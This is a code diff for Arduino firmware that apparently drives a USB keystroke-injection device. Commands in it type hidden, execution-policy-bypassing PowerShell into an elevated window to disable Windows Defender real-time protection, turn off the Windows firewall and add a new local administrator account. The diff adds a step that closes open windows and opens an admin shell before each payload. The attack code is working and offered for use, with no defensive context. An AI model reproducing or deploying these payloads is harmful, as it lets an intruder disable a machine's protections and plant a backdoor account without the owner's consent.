@@ -1,3 +1,4 @@
+// slave board code
 #include <Wire.h>
 #include <Keyboard.h>
 #include "lib/simple-instructions.h"
@@ -77,34 +78,48 @@ void executeCommand(String command)
   else if (command == "Ddefender")
   { // Disable Windows Defender
     String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true;\"";
-    openPowerShell();
+    killall();
+    openPowerShellAdmin();
     Serial.println(command);
     Keyboard.println(payload);
   }
   else if (command == "Dfirewall")
   { // Disable Windows Firewall
     String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"netsh advfirewall set allprofiles state off;\"";
-    openPowerShell();
+    killall();
+    openPowerShellAdmin();
     Serial.println(command);
     Keyboard.println(payload);
   }
   else if (command == "NewAdmin")
   { // Create a new admin user
     String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"net user " + String(admin_username) + " " + String(admin_password) + " /add; net localgroup administrators " + String(admin_username) + " /add;\"";
-    openPowerShell();
+    killall();
+    openPowerShellAdmin();
     Serial.println(command);
     Keyboard.println(payload);
+  }
+  else if (command == "None") {
+    for (int i = 0; i < 10; i++)
+    {
+      digitalWrite(LED_BUILTIN, HIGH);
+      delay(50);
+      digitalWrite(LED_BUILTIN, LOW);
+      delay(50);
+    }
+    digitalWrite(LED_BUILTIN, LOW);
   }
   else
   {
     Serial.println("Invalid command");
     for (int i = 0; i < 10; i++)
     {
-      digitalWrite(LED_BUILTIN, HIGH); // turn the LED on (HIGH is the voltage level)
-      delay(50);                       // wait for 50ms
-      digitalWrite(LED_BUILTIN, LOW);  // turn the LED off by making the voltage LOW
-      delay(50);                       // wait for 50ms
+      digitalWrite(LED_BUILTIN, HIGH);
+      delay(50);
+      digitalWrite(LED_BUILTIN, LOW);
+      delay(50);
     }
+    digitalWrite(LED_BUILTIN, LOW);
   }
   // Add more commands as needed
 }
